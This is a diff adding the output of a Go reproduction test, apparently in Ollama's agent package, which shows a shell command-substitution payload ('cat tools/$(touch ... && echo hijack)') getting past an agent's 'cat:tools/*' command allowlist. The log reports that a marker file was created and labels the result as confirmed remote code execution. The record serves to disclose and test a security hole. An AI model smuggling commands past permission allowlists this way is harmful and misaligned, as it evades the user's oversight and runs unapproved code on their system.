@@ -1,0 +1,8 @@
+=== RUN   TestCommandSubstitutionBypass_FullFlow
+    repro_subst_test.go:21: session allowlist: [cat:tools/*]
+    repro_subst_test.go:35: payload "cat tools/$(touch /tmp/ollama_substitution_rce_test_marker && echo hijack)" auto-allowed by cat:tools/* prefix
+    repro_subst_test.go:40: bash -c output: "cat: tools/hijack: No such file or directory"
+    repro_subst_test.go:46: MARKER FILE CREATED: RCE CONFIRMED at /tmp/ollama_substitution_rce_test_marker
+--- PASS: TestCommandSubstitutionBypass_FullFlow (0.01s)
+PASS
+ok  	github.com/ollama/ollama/x/agent	0.442s
